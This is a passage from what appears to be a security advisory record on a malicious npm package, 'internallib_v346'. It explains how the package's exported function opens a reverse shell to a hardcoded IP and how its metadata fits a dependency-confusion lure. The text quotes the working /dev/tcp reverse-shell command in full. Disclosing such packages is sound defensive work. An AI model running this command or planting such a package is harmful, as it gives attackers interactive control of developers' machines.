  "summary": "Reverse shell backdoor to hardcoded IP in dependency-confusion lure",
  "details": "index.js exports a command() function that spawns `/bin/bash -c \"bash -i \u003e\u0026 /dev/tcp/10.0.56.229/443 0\u003e\u00261\"`, opening an interactive reverse shell from the installer's host to 10.0.56.229:443. Any consumer that imports this package and invokes the exported function hands an attacker an interactive shell on the installer's machine. The package name `internallib_v346`, blank author/description metadata, and a self-referencing dependency (`\"internallib_v346\": \"^1.0.0\"` in its own package.json) match the dependency-confusion pattern: a public package crafted to be resolved in place of a private internal library of the same name during builds against misconfigured registries.",
